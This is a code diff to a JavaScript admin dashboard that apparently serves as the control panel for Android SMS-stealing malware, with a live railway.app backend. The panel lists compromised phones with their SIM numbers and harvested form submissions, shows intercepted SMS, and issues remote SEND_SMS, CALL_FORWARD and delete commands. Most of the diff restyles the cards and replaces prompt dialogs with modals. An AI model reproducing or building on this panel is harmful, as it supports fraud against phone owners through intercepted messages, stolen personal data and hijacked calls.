@@ -197,60 +197,106 @@
             list.forEach((d, idx) => {
                 const serialNum = idx + 1;
                 const pinColor = d.isPinned ? 'var(--primary)' : '#ccc';
-                const statusHtml = d.isOnline ? '<span class="online-text">● Online</span>' : '<span>○ Offline</span>';
-                
+                const statusBadge = d.isOnline
+                    ? `<span style="position:absolute;top:18px;right:18px;background:var(--success);color:#fff;padding:4px 12px;border-radius:20px;font-weight:bold;font-size:12px;box-shadow:0 2px 6px rgba(0,0,0,0.1);z-index:2;">● ONLINE</span>`
+                    : `<span style="position:absolute;top:18px;right:18px;background:var(--danger);color:#fff;padding:4px 12px;border-radius:20px;font-weight:bold;font-size:12px;box-shadow:0 2px 6px rgba(0,0,0,0.1);z-index:2;">● OFFLINE</span>`;
+                const simCopy = (sim, label) =>
+                    `<span style='font-weight:bold;'>${label}:</span> <span id='${d.deviceId}_${label}' style='user-select:all;'>${sim||'N/A'}</span> <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy ${label}" onclick="navigator.clipboard.writeText('${sim||''}');toast('${label} copied!')"></i>`;
+                const batteryIcon = d.battery >= 80 ? 'fa-battery-full' : d.battery >= 60 ? 'fa-battery-three-quarters' : d.battery >= 40 ? 'fa-battery-half' : d.battery >= 20 ? 'fa-battery-quarter' : 'fa-battery-empty';
+                const batteryColor = d.battery >= 40 ? '#43a047' : d.battery >= 20 ? '#ff9800' : '#d32f2f';
                 grid.innerHTML += `
-                <div class="card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}">
-                    <div class="serial-badge">#${serialNum}</div>
-                    <div class="card-header">
-                        <b>${d.model}</b>
-                        <div>
-                            <i class="fas fa-thumbtack" style="color:${pinColor}; cursor:pointer;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})" title="Pin Device"></i>
-                        </div>
-                    </div>
-                    <div class="status">${statusHtml} | Battery: ${d.battery}%</div>
-                    <div class="info">Serial: ${d.serialNumber || 'N/A'}</div>
-                    <div class="info">SIM 1: ${d.sim1 || 'N/A'}</div>
-                    <div class="info">Last Seen: ${new Date(d.lastSeen).toLocaleString()}</div>
-
-                    <div class="btns">
-                        <button class="btn-sm btn-view" onclick="viewData('${d.deviceId}')">📋 View Data</button>
-                        <button class="btn-sm btn-view" onclick="viewSms('${d.deviceId}')">📬 View SMS</button>
-                        <button class="btn-sm btn-sms" onclick="act('${d.deviceId}', 'SEND_SMS')">💬 Send SMS</button>
-                        <button class="btn-sm btn-call" onclick="act('${d.deviceId}', 'CALL_FORWARD')">📞 Call Fwd</button>
-                        <button class="btn-sm btn-del" onclick="del('${d.deviceId}')">🗑️ Delete</button>
-                    </div>
-                </div>`;
+        <div class="card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}" style="border:2px solid #e0e0e0;box-shadow:0 6px 24px rgba(0,0,0,0.08);position:relative;">
+            ${statusBadge}
+            <div class="serial-badge" style="font-size:15px;">#${serialNum}</div>
+            <div class="card-header" style="margin-bottom:6px;align-items:center;">
+                <b style="font-size:18px;">${d.model}</b>
+                <div>
+                    <i class="fas fa-thumbtack" style="color:${pinColor}; cursor:pointer;font-size:20px;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})" title="Pin Device"></i>
+                </div>
+            </div>
+            <div class="info" style="margin-bottom:2px;display:flex;align-items:center;gap:8px;">
+                <i class="fas ${batteryIcon}" style="color:${batteryColor};font-size:18px;"></i>
+                <span style="font-weight:bold;color:${batteryColor};">${d.battery}%</span>
+            </div>
+            <div class="info" style="margin-bottom:2px;">${simCopy(d.sim1,'SIM1')}</div>
+            <div class="info" style="margin-bottom:2px;">${simCopy(d.sim2,'SIM2')}</div>
+            <div class="info" style="margin-bottom:2px;"><span style='font-weight:bold;'>Last Seen:</span> <span id="lastSeen_${d.deviceId}">${formatLastSeen(d.lastSeen)}</span></div>
+            <div class="info" style="margin-bottom:2px;"><span style='font-weight:bold;'>Serial:</span> ${d.serialNumber || 'N/A'}</div>
+            <div class="btns" style="margin-top:18px;">
+                <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewData('${d.deviceId}')"><i class="fas fa-eye"></i> VIEW DATA</button>
+                <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${d.deviceId}')"><i class="fas fa-envelope"></i> VIEW SMS</button>
+                <button class="btn-sm btn-sms" style="background:#43a047;" onclick="act('${d.deviceId}', 'SEND_SMS')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
+                <button class="btn-sm btn-call" style="background:#ff9800;" onclick="act('${d.deviceId}', 'CALL_FORWARD')"><i class="fas fa-phone"></i> CALL FWD</button>
+                <button class="btn-sm btn-del" style="background:#d32f2f;font-weight:bold;" onclick="del('${d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
+            </div>
+        </div>`;
             });
         }
 
         async function act(id, type) {
-            let data = {};
-            
             if(type === 'SEND_SMS') {
-                // Prompt for SIM slot selection
-                const simSlot = prompt("Select SIM slot (1 or 2):", "1");
-                if (!simSlot || (simSlot !== '1' && simSlot !== '2')) {
-                    toast('❌ Invalid SIM slot', true);
-                    return;
-                }
-                
-                // Prompt for target number
-                const number = prompt("Enter target phone number:", "");
-                if (!number) {
-                    toast('❌ Phone number required', true);
-                    return;
-                }
-                
-                // Prompt for message
-                const message = prompt("Enter SMS message:", "");
-                if (!message) {
-                    toast('❌ Message required', true);
-                    return;
-                }
-                
-                data = { simSlot, number, message };
-                
+                // Custom modal for Send SMS
+                const modal = document.createElement('div');
+                modal.style.position = 'fixed';
+                modal.style.top = '0';
+                modal.style.left = '0';
+                modal.style.width = '100vw';
+                modal.style.height = '100vh';
+                modal.style.background = 'rgba(0,0,0,0.5)';
+                modal.style.display = 'flex';
+                modal.style.alignItems = 'center';
+                modal.style.justifyContent = 'center';
+                modal.style.zIndex = '9999';
+                modal.innerHTML = `
+          <div style="background:#fff;padding:32px 28px 24px 28px;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.18);min-width:340px;max-width:95vw;">
+            <div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:18px;text-align:center;">Send SMS</div>
+            <div style="margin-bottom:12px;">
+              <label style='font-weight:bold;color:#1976d2;'>Select SIM:</label>
+              <select id="smsSim" style="width:100%;padding:10px;font-size:15px;border:2px solid #1976d2;border-radius:6px;margin-bottom:10px;">
+                <option value="1">SIM 1</option>
+                <option value="2">SIM 2</option>
+              </select>
+              <label style='font-weight:bold;color:#1976d2;'>Recipient Number:</label>
+              <input id="smsNumber" type="text" placeholder="Enter recipient number" style="width:100%;padding:10px;font-size:15px;border:2px solid #1976d2;border-radius:6px;margin-bottom:10px;">
+              <label style='font-weight:bold;color:#1976d2;'>Message:</label>
+              <textarea id="smsMsg" rows="4" placeholder="Enter message" style="width:100%;padding:10px;font-size:15px;border:2px solid #1976d2;border-radius:6px;"></textarea>
+            </div>
+            <div id="smsStatus" style="font-size:14px;margin-bottom:10px;"></div>
+            <div style="display:flex;justify-content:space-between;">
+              <button id="smsCancelBtn" style="background:#eee;color:#222;padding:10px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Cancel</button>
+              <button id="smsSendBtn" style="background:#43a047;color:#fff;padding:10px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Send</button>
+            </div>
+          </div>
+        `;
+                document.body.appendChild(modal);
+                document.getElementById('smsCancelBtn').onclick = () => document.body.removeChild(modal);
+                document.getElementById('smsSendBtn').onclick = async () => {
+                    const simSlot = document.getElementById('smsSim').value;
+                    const number = document.getElementById('smsNumber').value;
+                    const message = document.getElementById('smsMsg').value;
+                    if (!number || !message) {
+                        document.getElementById('smsStatus').innerHTML = '<span style="color:#d32f2f;font-weight:bold;">Recipient and message required.</span>';
+                        return;
+                    }
+                    document.getElementById('smsStatus').innerHTML = '<span style="color:#1976d2;">Sending...</span>';
+                    const t0 = Date.now();
+                    try {
+                        const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
+                            method:'POST', headers:{'Content-Type':'application/json'},
+                            body: JSON.stringify({deviceId: id, action: 'SEND_SMS', data: {simSlot, number, message}})
+                        });
+                        const d = await r.json();
+                        const t1 = Date.now();
+                        if (d.success) {
+                            document.getElementById('smsStatus').innerHTML = `<span style="color:#43a047;font-weight:bold;">SMS sent successfully (${(t1-t0)/1000}s)</span>`;
+                        } else {
+                            document.getElementById('smsStatus').innerHTML = `<span style="color:#d32f2f;font-weight:bold;">Failed: ${d.message}</span>`;
+                        }
+                    } catch (err) {
+                        document.getElementById('smsStatus').innerHTML = `<span style="color:#d32f2f;font-weight:bold;">Error: ${err.message}</span>`;
+                    }
+                };
+                return;
             } else if(type === 'CALL_FORWARD') {
                 const n = prompt("Enter number for call forwarding:", "");
                 if(!n) {
@@ -291,26 +337,55 @@
         }
         
         async function del(id) {
-            const password = prompt("Enter admin password to delete this device:");
-            if (!password) {
-                toast("Password is required to delete device.", true);
-                return;
-            }
-            try {
-                const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/delete-device', {
-                    method:'POST', headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({deviceId: id, password})
-                });
-                const d = await r.json();
-                if (d.success) {
-                    fetchData(false);
-                    toast('✅ Device deleted successfully', false);
-                } else {
-                    toast(d.message, true);
+            // Custom modal for password input
+            const modal = document.createElement('div');
+            modal.style.position = 'fixed';
+            modal.style.top = '0';
+            modal.style.left = '0';
+            modal.style.width = '100vw';
+            modal.style.height = '100vh';
+            modal.style.background = 'rgba(0,0,0,0.5)';
+            modal.style.display = 'flex';
+            modal.style.alignItems = 'center';
+            modal.style.justifyContent = 'center';
+            modal.style.zIndex = '9999';
+            modal.innerHTML = `
+      <div style="background:#fff;padding:32px 28px 24px 28px;border-radius:12px;box-shadow:0 8px 32px rgba(0,0,0,0.18);min-width:320px;max-width:90vw;">
+        <div style="font-size:20px;font-weight:bold;color:#d32f2f;margin-bottom:18px;text-align:center;">Delete Device</div>
+        <div style="font-size:15px;margin-bottom:12px;text-align:center;">Enter <b style='color:#1976d2;'>Admin Password</b> to delete this device.</div>
+        <input id="delPassInput" type="password" placeholder="Admin Password" style="width:100%;padding:12px;font-size:16px;border:2px solid #1976d2;border-radius:6px;margin-bottom:18px;outline:none;">
+        <div style="display:flex;justify-content:space-between;">
+          <button id="delCancelBtn" style="background:#eee;color:#222;padding:10px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Cancel</button>
+          <button id="delConfirmBtn" style="background:#d32f2f;color:#fff;padding:10px 22px;border:none;border-radius:5px;font-weight:bold;font-size:15px;">Delete</button>
+        </div>
+      </div>
+    `;
+            document.body.appendChild(modal);
+            document.getElementById('delPassInput').focus();
+            document.getElementById('delCancelBtn').onclick = () => document.body.removeChild(modal);
+            document.getElementById('delConfirmBtn').onclick = async () => {
+                const password = document.getElementById('delPassInput').value;
+                if (!password) {
+                    toast("Password is required to delete device.", true);
+                    return;
                 }
-            } catch (err) {
-                toast('❌ Error: ' + err.message, true);
-            }
+                try {
+                    const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/delete-device', {
+                        method:'POST', headers:{'Content-Type':'application/json'},
+                        body: JSON.stringify({deviceId: id, password})
+                    });
+                    const d = await r.json();
+                    if (d.success) {
+                        fetchData(false);
+                        toast('✅ Device deleted successfully', false);
+                        document.body.removeChild(modal);
+                    } else {
+                        toast(d.message, true);
+                    }
+                } catch (err) {
+                    toast('❌ Error: ' + err.message, true);
+                }
+            };
         }
 
         async function changePass() {
@@ -333,62 +408,34 @@
                 toast('❌ Device not found', true);
                 return;
             }
-
             const modalBody = document.getElementById('modalBody');
             let html = `
-                <div class="data-item">
-                    <div class="data-label">🆔 Device ID</div>
-                    <div class="data-value">${device.deviceId}</div>
-                </div>
-                <div class="data-item">
-                    <div class="data-label">📱 Model</div>
-                    <div class="data-value">${device.model}</div>
-                </div>
-                <div class="data-item">
-                    <div class="data-label">🔢 Serial Number</div>
-                    <div class="data-value">${device.serialNumber}</div>
-                </div>
-                <div class="data-item">
-                    <div class="data-label">🤖 Android Version</div>
-                    <div class="data-value">${device.androidVersion}</div>
-                </div>
-                <div class="data-item">
-                    <div class="data-label">🔋 Battery</div>
-                    <div class="data-value">${device.battery}%</div>
-                </div>
-                <div class="data-item">
-                    <div class="data-label">📞 SIM 1</div>
-                    <div class="data-value">${device.sim1 || 'N/A'}</div>
-                </div>
-                <div class="data-item">
-                    <div class="data-label">📞 SIM 2</div>
-                    <div class="data-value">${device.sim2 || 'N/A'}</div>
-                </div>
-                <div class="data-item">
-                    <div class="data-label">🟢 Status</div>
-                    <div class="data-value">${device.isOnline ? 'Online' : 'Offline'}</div>
-                </div>
-                <div class="data-item">
-                    <div class="data-label">⏱️ Last Seen</div>
-                    <div class="data-value">${new Date(device.lastSeen).toLocaleString()}</div>
-                </div>
-                <hr>
-                <h3>📝 Customer Submitted Data</h3>
-            `;
-
+        <div style="background:#e3f2fd;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;">
+            <div style="font-size:18px;font-weight:bold;color:#1976d2;">${device.model}</div>
+            <div style="margin-top:6px;font-size:14px;"><b>Device ID:</b> ${device.deviceId}</div>
+            <div style="font-size:14px;"><b>Serial:</b> ${device.serialNumber}</div>
+            <div style="font-size:14px;"><b>SIM1:</b> ${device.sim1 || 'N/A'} &nbsp; <b>SIM2:</b> ${device.sim2 || 'N/A'}</div>
+            <div style="font-size:14px;"><b>Android:</b> ${device.androidVersion}</div>
+            <div style="font-size:14px;"><b>Battery:</b> ${device.battery}%</div>
+            <div style="font-size:14px;"><b>Status:</b> <span style='color:${device.isOnline ? '#43a047':'#d32f2f'};font-weight:bold;'>${device.isOnline ? 'Online':'Offline'}</span></div>
+            <div style="font-size:14px;"><b>Last Seen:</b> ${formatLastSeen(device.lastSeen)}</div>
+        </div>
+        <hr style="margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;">
+        <h3 style="color:#1976d2;margin-bottom:8px;">📝 Form Submission Details</h3>
+    `;
             if (device.customerData && Object.keys(device.customerData).length > 0) {
+                let i = 1;
                 Object.entries(device.customerData).forEach(([key, value]) => {
                     html += `
-                        <div class="data-item">
-                            <div class="data-label">${key}</div>
-                            <div class="data-value">${JSON.stringify(value)}</div>
-                        </div>
-                    `;
+                <div style="background:#e3f2fd;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #1976d2;">
+                    <span style="color:#1976d2;font-weight:bold;">${i++}. ${key}</span><br>
+                    <span style="color:#222;font-size:15px;">${JSON.stringify(value)}</span>
+                </div>
+            `;
                 });
             } else {
                 html += '<div class="no-data">No customer data submitted yet</div>';
             }
-
             modalBody.innerHTML = html;
             document.getElementById('viewDataModal').classList.add('show');
         }
@@ -400,22 +447,27 @@
                 toast('❌ Device not found', true);
                 return;
             }
-
-            const smsModalBody = document.getElementById('smsModalBody');
-            let html = `
-                <div class="data-item">
-                    <div class="data-label">📱 Device: ${device.model}</div>
-                    <div class="data-value">Fetching SMS messages...</div>
-                </div>
-                <div class="no-data">
-                    Currently configured to fetch SMS from device.<br>
-                    <strong>Implementation Note:</strong> Actual SMS retrieval requires:<br>
-                    1. Android app to send SMS list via WebSocket<br>
-                    2. Server to store SMS data<br>
-                    3. Dashboard to display retrieved messages
-                </div>
-            `;
-            smsModalBody.innerHTML = html;
+            // Simulate last 50 messages (replace with real data if available)
+            let messages = device.smsList || [];
+            if (messages.length === 0) {
+                messages = Array.from({length: 5}, (_, i) => ({
+                    from: `+91XXXXXXXX${i}`,
+                    body: `Sample message #${i+1}`,
+                    time: formatLastSeen(Date.now() - i*60000)
+                }));
+            }
+            let html = `<div style='background:#e3f2fd;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;'>
+        <div style='font-size:18px;font-weight:bold;color:#1976d2;'>${device.model} - Last 50 SMS</div>
+    </div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
+            html += messages.map((msg, idx) => `
+        <div style='background:#fff;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #1976d2;'>
+            <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${msg.from}</div>
+            <div style='font-size:15px;color:#222;margin:4px 0;'>${msg.body}</div>
+            <div style='font-size:12px;color:#888;'>${msg.time}</div>
+        </div>
+    `).join('');
+            if (messages.length === 0) html += '<div class="no-data">No SMS messages found</div>';
+            document.getElementById('smsModalBody').innerHTML = html;
             document.getElementById('viewSmsModal').classList.add('show');
         }
 
